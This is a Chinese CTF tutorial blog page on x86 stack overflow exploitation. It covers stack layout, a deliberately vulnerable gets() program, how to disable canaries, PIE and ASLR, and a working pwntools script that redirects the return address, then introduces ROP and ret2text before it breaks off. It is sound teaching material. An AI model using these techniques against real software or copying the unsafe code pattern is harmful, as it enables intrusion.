<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF-Pwn Stack Overflow要点, JackHCC">
    <meta name="description" content="CTF Pwn Stack Overflow学习要点">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>CTF-Pwn Stack Overflow要点 | JackHCC</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/css/my.css">
    
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/jquery/jquery.min.js"></script>
    
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="JackHCC" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper head-container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/me.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">JackHCC</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>Tools</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="https://creativecc.cn/" target="_blank" rel="noopener">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Creative工具导航</span>
        </a>
      </li>
      
      <li>
        <a href="https://blog.creativecc.cn/Arxiv-NLP-Reporter/" target="_blank" rel="noopener">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>NLP每日论文</span>
        </a>
      </li>
      
      <li>
        <a href="http://chat.creativecc.cn/" target="_blank" rel="noopener">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>RocketChat聊天室</span>
        </a>
      </li>
      
      <li>
        <a href="/contact">
          
          <i class="fas fa-comments" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Contact留言板</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/me.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">JackHCC</div>
        <div class="logo-desc">
            
            Make the world betterrrr!!!
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			Tools
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>   
				
                  <a href="https://creativecc.cn/ " target="_blank" rel="noopener" style="margin-left:75px";>
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Creative工具导航</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="https://blog.creativecc.cn/Arxiv-NLP-Reporter/ " target="_blank" rel="noopener" style="margin-left:75px";>
				  
				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
			      
		          <span>NLP每日论文</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="http://chat.creativecc.cn/ " target="_blank" rel="noopener" style="margin-left:75px";>
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>RocketChat聊天室</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/contact " style="margin-left:75px";>
				  
				   <i class="fa fas fa-comments" style="position: absolute;left:50px" ></i>
			      
		          <span>Contact留言板</span>
                  </a>
                </li>
               
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/JackHCC/JackHCC.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/JackHCC/JackHCC.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF-Pwn Stack Overflow要点</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 30px;
        bottom: 146px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF-Pwn/">
                                <span class="chip bg-color">CTF-Pwn</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-08-20
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2021-09-11
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    45.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    219 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>

        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><strong>X86</strong></p>
<hr>
<h1 id="栈介绍"><a href="#栈介绍" class="headerlink" title="栈介绍"></a>栈介绍</h1><h2 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/Data_stack.png" alt="基本栈操作"></p>
<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>请务必仔细看一下下面的文章来学习一下基本的函数调用栈。</p>
<ul>
<li><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">C 语言函数调用栈 (一)</a></li>
<li><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C 语言函数调用栈 (二)</a></li>
</ul>
<p>这里再给出另外一张寄存器的图</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/register-16298950597184.png" alt=""></p>
<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
<ul>
<li>x86<ul>
<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
</ul>
</li>
<li>x64<ul>
<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
</ul>
</li>
</ul>
<h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">void</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You Hava already controlled it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
<p>我们利用如下命令对其进行编译</p>
<pre><code>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.</code></pre><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
<blockquote>
<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
</blockquote>
<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
<pre><code>➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-14h]@1</span>

  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
<pre><code>                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14--&gt;+-----------------+</code></pre><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
<pre><code>.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp</code></pre><p>那么如果我们读取的字符串为</p>
<pre><code>0x14*'a'+'bbbb'+success_addr</code></pre><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
<pre><code>                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14--&gt;+-----------------+</code></pre><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
<pre><code>\x3b\x84\x04\x08</code></pre><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##coding=utf8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">## 构造与程序交互的对象</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack_example'</span><span class="token punctuation">)</span>
success_addr <span class="token operator">=</span> <span class="token number">0x0804843b</span>
<span class="token comment" spellcheck="true">## 构造payload</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x14</span> <span class="token operator">+</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">## 向程序发送字符串</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">## 将代码交互转换为手工交互</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行一波代码，可以得到</p>
<pre><code>➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive</code></pre><p>可以看到我们确实已经执行 success 函数。</p>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
<ul>
<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
<li>直接地址索引，就相当于直接给定了地址。</li>
</ul>
<p>一般来说，我们会有如下的覆盖需求</p>
<ul>
<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
</ul>
<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
<h1 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">ret2text</a></p>
<p>首先，查看一下程序的保护机制</p>
<pre><code>➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>
